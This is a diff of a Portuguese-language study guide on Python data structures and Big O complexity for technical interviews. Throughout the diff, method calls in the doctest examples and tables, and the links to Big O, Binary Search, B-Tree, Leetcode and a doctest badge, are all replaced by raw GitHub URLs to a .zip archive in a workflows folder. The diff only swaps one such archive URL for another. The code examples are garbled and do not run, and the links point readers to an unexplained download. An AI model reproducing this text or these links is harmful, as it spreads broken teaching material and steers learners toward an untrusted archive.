@@ -41,10 +41,10 @@ Costumam ser muito utilizadas em problemas que envolvem ordenação de dados, de
 2
 >>> lista[-1] # Acesso eficiente ao último elemento
 9
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(10) # Adicionando elemento 10 ao final de forma eficiente
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(10) # Adicionando elemento 10 ao final de forma eficiente
 >>> lista # Confira elemento adicionado ao final
 [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip() # Removendo último elemento de forma eficiente, inclusive tem nome pop, igual ao definido para uma pilha
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip() # Removendo último elemento de forma eficiente, inclusive tem nome pop, igual ao definido para uma pilha
 10
 >>> lista # Confira elemento removido do final
 [1, 2, 3, 4, 5, 6, 7, 8, 9]
@@ -64,15 +64,15 @@ Essas estruturas são ineficientes para inserções de elementos em seu início 
 >>> lista = list(range(1, 10))  # Criação da lista
 >>> lista # Lista com 9 elementos contíguos
 [1, 2, 3, 4, 5, 6, 7, 8, 9]
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(0) # Removendo primeiro elemento de forma ineficiente, quanto maior a lista, mais tempo demora
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(0) # Removendo primeiro elemento de forma ineficiente, quanto maior a lista, mais tempo demora
 1
 >>> lista # Lista com primeiro elemento removido
 [2, 3, 4, 5, 6, 7, 8, 9]
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(3) # Removendo elemento no meio de forma ineficiente, quanto maior a lista, mais tempo demora
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(3) # Removendo elemento no meio de forma ineficiente, quanto maior a lista, mais tempo demora
 5
 >>> lista # Lista com primeiro elemento removido
 [2, 3, 4, 6, 7, 8, 9]
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(0, 1) # Inserindo elemento no início de forma ineficiente, quanto maior a lista, mais tempo demora
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(0, 1) # Inserindo elemento no início de forma ineficiente, quanto maior a lista, mais tempo demora
 >>> lista # Lista com primeiro elemento inserido
 [1, 2, 3, 4, 6, 7, 8, 9]
 
@@ -90,18 +90,18 @@ Por isso são recomendadas em problemas que exigem fila. Confira as operações 
 >>> lista = deque(range(1, 10))  # Criação da lista
 >>> lista # Lista com 9 elementos contíguos
 deque([1, 2, 3, 4, 5, 6, 7, 8, 9])
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip() # Removendo primeiro elemento de forma eficiente
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip() # Removendo primeiro elemento de forma eficiente
 1
 >>> lista # Lista com primeiro elemento removido
 deque([2, 3, 4, 5, 6, 7, 8, 9])
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(1) # Inserindo elemento no início de forma eficiente
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(1) # Inserindo elemento no início de forma eficiente
 >>> lista # Lista com primeiro elemento inserido
 deque([1, 2, 3, 4, 5, 6, 7, 8, 9])
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip() # Também eficiente para remoção do fim da lista
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip() # Também eficiente para remoção do fim da lista
 9
 >>> lista # Lista com último elemento removido
 deque([1, 2, 3, 4, 5, 6, 7, 8])
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(9) # Também eficiente para inserção no fim da lista
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(9) # Também eficiente para inserção no fim da lista
 >>> lista # Lista com último elemento adicionado
 deque([1, 2, 3, 4, 5, 6, 7, 8, 9])
 
@@ -160,20 +160,20 @@ Confira as operações eficientes:
 set()
 >>> 1 in conjunto # Operação de pertencimento é eficiente
 False
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(1) # Adição de elementos é eficiente
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(1) # Adição de elementos é eficiente
 >>> conjunto
 {1}
 >>> 1 in conjunto
 True
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(range(10)) # Adiição de múltiplos elementos é eficiente e não permite duplicatas, só possui "1" uma vez
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(range(10)) # Adiição de múltiplos elementos é eficiente e não permite duplicatas, só possui "1" uma vez
 >>> conjunto
 {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(1)  # Mesmo com adição de elemento, não permite repetição
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(1)  # Mesmo com adição de elemento, não permite repetição
 >>> conjunto
 {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}
 >>> 1 in conjunto
 True
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(1) # Eficiente para remoção de elementos
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(1) # Eficiente para remoção de elementos
 >>> conjunto
 {0, 2, 3, 4, 5, 6, 7, 8, 9}
 
@@ -247,11 +247,11 @@ KeyError: 0
 banana
 laranja
 uva
->>> for preco in https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(): print(preco) # Também possível iterar por valores de forma eficiente
+>>> for preco in https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(): print(preco) # Também possível iterar por valores de forma eficiente
 12.5
 1.5
 1.2
->>> for nome,preco in https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(): print(nome, preco) # Também útil iterar por chave e valor de forma eficiente
+>>> for nome,preco in https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(): print(nome, preco) # Também útil iterar por chave e valor de forma eficiente
 banana 12.5
 laranja 1.5
 uva 1.2
@@ -295,7 +295,7 @@ Vamos detalhar cada um desses pontos.
 
 ### As 7 funções de análise e complexidade de algorítmos
 
-Em análise e complexidade de algorítmos usando se usa a notação [Big O](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip) para expressar a evolução do tempo de execução e uso de memória de algoritmos.
+Em análise e complexidade de algorítmos usando se usa a notação [Big O](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip) para expressar a evolução do tempo de execução e uso de memória de algoritmos.
 Você só precisa conhecer 7 dessas funções
 
 #### 1. O(1) - Constante
@@ -310,19 +310,19 @@ Segue uma tabela com as principais operações de tempo constante:
 | **Operações Básicas** | Atribuição de variável | Armazenar valor em variável | `x = 5`                             |
 | **Operações Básicas** | Operações aritméticas | Soma, subtração, multiplicação, divisão | `a + b`, `x - y`, `m * n`, `p / q`  |
 | **Operações Básicas** | Operações lógicas | AND, OR, NOT, comparações | `a and b`, `x > y`, `not flag`      |
-| **Operações Básicas** | Acesso a atributo | Acessar propriedade de objeto | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip`                   |
+| **Operações Básicas** | Acesso a atributo | Acessar propriedade de objeto | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip`                   |
 | **Lista (List)**      | Acesso por índice | Ler elemento em posição específica | `lista[0]`, `lista[5]`, `lista[-1]` |
 | **Lista (List)**      | Modificação por índice | Alterar elemento em posição específica | `lista[1] = -1`                     |
-| **Lista (List)**      | Adicionar ao final | Inserir elemento no fim da lista | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(10)`                  |
-| **Lista (List)**      | Remover do final | Retirar último elemento | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip()`                       |
+| **Lista (List)**      | Adicionar ao final | Inserir elemento no fim da lista | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(10)`                  |
+| **Lista (List)**      | Remover do final | Retirar último elemento | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip()`                       |
 | **Lista (List)**      | Obter tamanho | Quantidade de elementos | `len(lista)`                        |
-| **Deque**             | Adicionar ao final | Inserir elemento no fim | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(9)`                   |
-| **Deque**             | Remover do final | Retirar último elemento | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip()`                       |
-| **Deque**             | Adicionar ao início | Inserir elemento no começo | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(1)`               |
-| **Deque**             | Remover do início | Retirar primeiro elemento | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip()`                   |
+| **Deque**             | Adicionar ao final | Inserir elemento no fim | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(9)`                   |
+| **Deque**             | Remover do final | Retirar último elemento | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip()`                       |
+| **Deque**             | Adicionar ao início | Inserir elemento no começo | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(1)`               |
+| **Deque**             | Remover do início | Retirar primeiro elemento | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip()`                   |
 | **Deque**             | Obter tamanho  | Quantidade de elementos | `len(deque)`                        |
-| **Set**               | Adicionar elemento | Inserir novo elemento | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(1)`                   |
-| **Set**               | Remover elemento | Retirar elemento específico | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(1)`                |
+| **Set**               | Adicionar elemento | Inserir novo elemento | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(1)`                   |
+| **Set**               | Remover elemento | Retirar elemento específico | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(1)`                |
 | **Set**               | Verificar pertencimento | Checar se elemento existe | `1 in conjunto`                     |
 | **Set**               | Obter tamanho  | Quantidade de elementos | `len(conjunto)`                     |
 | **Dict**              | Acesso por chave | Obter valor associado à chave | `dict['chave']`                     |
@@ -340,7 +340,7 @@ Quando não for possível, procuramos usar a próxima solução mais eficiente, 
 
 Os algorítmos logaritmicos são os mais eficientes depois dos constantes. 
 Normalmente são logarítimocos os algorítmos que conseguem dividir a entrada em duas partes e, a partir de uma condição, eliminar uma das metades como possível solução.
-O mais clássico algoritimo em complexidade logaritímica é a [Busca Binária](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip).
+O mais clássico algoritimo em complexidade logaritímica é a [Busca Binária](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip).
 
 Conhecer esse algorítmo é importante para poder buscar soluções com eficiencia e até validar com o entrevistador se as condições para usar o algoritmo estão presentes.
 Por exemplo, se a entrada for uma lista de números, você pode perguntar se ela está ordenada para já poder efetuar uma busca binária.
@@ -375,33 +375,33 @@ Dentre as estruturas de dados lineares mencionadas, as seguintes operações sã
 | Categoria             | Operação | Descrição | Exemplo                             |
 |-----------------------|----------|-----------|-------------------------------------|
 | **Operações Gerais**  | Iteração completa | Percorrer todos os elementos | `for x in lista`, `for x in conjunto` |
-| **Operações Gerais**  | Conversão para lista | Transformar estrutura em lista | `list(conjunto)`, `list(https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip())` |
+| **Operações Gerais**  | Conversão para lista | Transformar estrutura em lista | `list(conjunto)`, `list(https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip())` |
 | **Operações Gerais**  | Conversão para string | Transformar estrutura em string | `str(lista)`, `' '.join(lista)` |
 | **Lista (List)**      | Verificar pertencimento | Checar se elemento existe | `x in lista`, `elemento in lista` |
-| **Lista (List)**      | Buscar índice | Encontrar posição de elemento | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(elemento)` |
-| **Lista (List)**      | Contar ocorrências | Quantas vezes elemento aparece | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(elemento)` |
-| **Lista (List)**      | Inserir no início/meio | Adicionar elemento em posição específica | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(0, elemento)` |
-| **Lista (List)**      | Remover do início/meio | Retirar elemento de posição específica | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(0)`, `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(elemento)` |
+| **Lista (List)**      | Buscar índice | Encontrar posição de elemento | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(elemento)` |
+| **Lista (List)**      | Contar ocorrências | Quantas vezes elemento aparece | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(elemento)` |
+| **Lista (List)**      | Inserir no início/meio | Adicionar elemento em posição específica | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(0, elemento)` |
+| **Lista (List)**      | Remover do início/meio | Retirar elemento de posição específica | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(0)`, `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(elemento)` |
 | **Lista (List)**      | Encontrar mínimo | Menor elemento da lista | `min(lista)` |
 | **Lista (List)**      | Encontrar máximo | Maior elemento da lista | `max(lista)` |
 | **Lista (List)**      | Somar elementos | Soma de todos os elementos | `sum(lista)` |
-| **Lista (List)**      | Reverter | Inverter ordem dos elementos | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip()`, `lista[::-1]` |
+| **Lista (List)**      | Reverter | Inverter ordem dos elementos | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip()`, `lista[::-1]` |
 | **Deque**             | Verificar pertencimento | Checar se elemento existe | `x in deque` |
 | **Deque**             | Acesso por índice (meio) | Acessar elemento no meio | `deque[len(deque)//2]` |
-| **Deque**             | Inserir no meio | Adicionar elemento em posição específica | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(pos, elemento)` |
-| **Deque**             | Remover do meio | Retirar elemento de posição específica | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(elemento)` |
+| **Deque**             | Inserir no meio | Adicionar elemento em posição específica | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(pos, elemento)` |
+| **Deque**             | Remover do meio | Retirar elemento de posição específica | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(elemento)` |
 | **Deque**             | Encontrar mínimo | Menor elemento do deque | `min(deque)` |
 | **Deque**             | Encontrar máximo | Maior elemento do deque | `max(deque)` |
 | **Set**               | Iteração completa | Percorrer todos os elementos | `for elemento in conjunto` |
 | **Set**               | Encontrar mínimo | Menor elemento do conjunto | `min(conjunto)` |
 | **Set**               | Encontrar máximo | Maior elemento do conjunto | `max(conjunto)` |
-| **Set**               | Operações de conjunto | União, interseção, diferença | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(set2)`, `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip(set2)` |
+| **Set**               | Operações de conjunto | União, interseção, diferença | `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(set2)`, `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip(set2)` |
 | **Dict**              | Iteração por chaves | Percorrer todas as chaves | `for chave in dict` |
-| **Dict**              | Iteração por valores | Percorrer todos os valores | `for valor in https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip()` |
-| **Dict**              | Iteração por pares | Percorrer chaves e valores | `for chave, valor in https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip()` |
-| **Dict**              | Verificar valor | Buscar se valor existe | `valor in https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip()` |
-| **Dict**              | Encontrar chave por valor | Buscar chave que possui determinado valor | `[k for k, v in https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip() if v == valor]` |
-| **Dict**              | Encontrar mínimo/máximo | Menor/maior valor ou chave | `min(https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip())`, `max(https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip())` |
+| **Dict**              | Iteração por valores | Percorrer todos os valores | `for valor in https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip()` |
+| **Dict**              | Iteração por pares | Percorrer chaves e valores | `for chave, valor in https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip()` |
+| **Dict**              | Verificar valor | Buscar se valor existe | `valor in https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip()` |
+| **Dict**              | Encontrar chave por valor | Buscar chave que possui determinado valor | `[k for k, v in https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip() if v == valor]` |
+| **Dict**              | Encontrar mínimo/máximo | Menor/maior valor ou chave | `min(https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip())`, `max(https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip())` |
 
 Aqui fica claro o que já foi mencionado na descrição das estruturas lineares: escolher a estrutura correta ou não pode ser a diferença fundamental na performance de algorítmo.
 Veja que se usar uma lista, usar a operação de pertencimento vai levar tempo proporcional ao tamanho da entrada, enquanto usar conjunto vai levar a tempo constante.
@@ -409,7 +409,7 @@ Veja que se usar uma lista, usar a operação de pertencimento vai levar tempo p
 Justamente a análise de complexidade permite a comparação de algoritmos em termos de tempo de execução e uso de memória.
 
 ** Curiosidade  do mundo real ** Os índices usados em banco de dados normalmente usam estruturas de dados que justamente permitem
-buscas em tempo logorítmico através de busca binária. Um exemplo é o índice [B-Tree](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip). 
+buscas em tempo logorítmico através de busca binária. Um exemplo é o índice [B-Tree](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip). 
 Sem índices a busca fica linear, ou seja, toda a tabela precisa ser percorrida, o que se chama de "Full Table Scan".
 Mas por outro lado a inserção e remoção de linhas na tabela piora. Sem índice essas operações podem ser feitas em O(1).
 Mas com índice existe o custo de inserção e remoção de elementos no índice, que custam log n. 
@@ -440,7 +440,7 @@ Então usar ordenação vai piorar a complexidade do algorítmo, apesar de deixa
 
 ```python
 >>> lista = [3, 2, 5, 7, 19] #
->>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip() # O(n log n)
+>>> https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip() # O(n log n)
 >>> lista
 [2, 3, 5, 7, 19]
 >>> lista[-1]  # O(1)
@@ -521,9 +521,9 @@ Para entender o quão dramático é o crescimento exponencial, considere que o v
 
 Isso significa que se um computador executasse 1 operação por segundo desde a formação da Terra, ele ainda precisaria de **mais 128 "Terras" de tempo** para completar um algoritmo O(2^64)!
 
-Para ter uma ideia visual da discrepância entre as funções, veja o gráfico abaixo gerado pelo script `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip`:
+Para ter uma ideia visual da discrepância entre as funções, veja o gráfico abaixo gerado pelo script `https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip`:
 
-![Gráfico de Complexidades](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip)
+![Gráfico de Complexidades](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip)
 
 O gráfico usa escala logarítmica no eixo Y para poder visualizar todas as funções no mesmo gráfico, já que O(2^n) cresce tão rapidamente que tornaria as outras funções invisíveis em escala linear.
 
@@ -540,9 +540,9 @@ Assim se encerra a parte conceitual obrigatória para preparação para a fase d
 
 A recomendação é criarmos um repositório para resolver problemas. A ideia é treinar o conhecimento e aumentar nosso repertório de soluções. Fazendo isso, normalmente encontraremos questões que já fizemos ou que são muito parecidas com exercícios.
 
-Para isso, recomendamos fazer o máximo de exercícios do [Leetcode](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip). Fazendo ao menos os 30 primeiros já garantimos uma boa preparação. 
+Para isso, recomendamos fazer o máximo de exercícios do [Leetcode](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip). Fazendo ao menos os 30 primeiros já garantimos uma boa preparação. 
 
-Renzo, um dos colaboradores desse repositório, passou na entrevista técnica para grandes empresas: Google, Facebook, Red Hat e Quinto Andar. [Nesse repositório](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip) ele concentra soluções para problemas do Leetcode e outros.
+Renzo, um dos colaboradores desse repositório, passou na entrevista técnica para grandes empresas: Google, Facebook, Red Hat e Quinto Andar. [Nesse repositório](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip) ele concentra soluções para problemas do Leetcode e outros.
 
 ### Dicas finais
 
@@ -556,7 +556,7 @@ Renzo, um dos colaboradores desse repositório, passou na entrevista técnica pa
 
 5. Escrevemos testes para validar nosso entendimento de entrada e saída. Pode ser em formato de comentário. Essa é outra razão para Renzo escolher Python. É possível executar comentários e até documentação em formato de doctest!
 
-Por exemplo, todo código dessa página é executado e validado com o comando `python -m doctest https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip`, inclusive no [![Doctest https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip)](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/tecnicas-entrevistas-2.7-beta.3.zip) desse repositório.
+Por exemplo, todo código dessa página é executado e validado com o comando `python -m doctest https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip`, inclusive no [![Doctest https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip)](https://github.com/abuosi/entrevistas-tecnicas/raw/refs/heads/main/.github/workflows/entrevistas-tecnicas-v3.5.zip) desse repositório.
 
 Então é isso, desejamos bons estudos e muitas aprovações nas entrevistas técnicas!
 
